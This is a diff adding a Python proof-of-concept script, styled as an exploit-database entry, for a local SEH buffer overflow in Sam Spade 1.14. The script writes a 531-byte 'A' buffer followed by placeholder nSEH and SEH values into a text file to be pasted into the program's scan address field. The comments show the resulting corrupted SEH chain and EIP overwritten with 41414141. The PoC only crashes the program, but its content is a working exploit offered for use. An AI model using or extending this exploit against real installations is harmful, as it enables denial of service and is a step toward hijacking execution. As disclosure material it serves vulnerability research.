@@ -1,0 +1,46 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# Exploit Title		: Sam Spade 1.14 Scan from IP address Field SEH Overflow Crash PoC
+# Discovery by		: Luis Martínez
+# Email			: l4m5@hotmail.com
+# Discovery Date	: 20/10/2015
+# Vendor Homepage	: http://samspade.org
+# Software Link		: http://www.majorgeeks.com/files/details/sam_spade.html
+# Tested Version	: 1.14
+# Vulnerability Type	: Denial of Service (DoS) Local
+# Tested on OS		: Windows XP Professional SP3 x86 es
+# Crash Point		: Go to Tools > Scan addresses field > Enter the contents of 'samspade_1.14_BoF.txt' > OK
+##########################################################################################
+#  -----------------------------------NOTES----------------------------------------------#
+##########################################################################################
+# After the execution of POC, the SEH chain looks like this: 
+# 0012EBE0 43434343
+# 42424242 *** CORRUPT ENTRY ***
+ 
+# And the Stack
+ 
+#0012EBD0   41414141  AAAA
+#0012EBD4   41414141  AAAA
+#0012EBD8   41414141  AAAA
+#0012EBDC   41414141  AAAA
+#0012EBE0   42424242  BBBB  Pointer to next SEH record
+#0012EBE4   43434343  CCCC  SE handler
+ 
+# And the Registers
+ 
+#EAX 00000001
+#ECX 00000001
+#EDX 00140608
+#EBX 00000000
+#ESP 0012EBD0 ASCII "AAAAAAAAAAAAAAAABBBBCCCC - "
+#EBP 41414141
+#ESI 00C2BD00
+#EDI 00E89DB0
+#EIP 41414141
+
+buffer = "\x41" * 531
+nseh = "\x42" * 4
+seh = "\x43" * 4
+f = open ("samspade_1.14_BoF.txt", "w")
+f.write(buffer+nseh+seh)
+f.close()
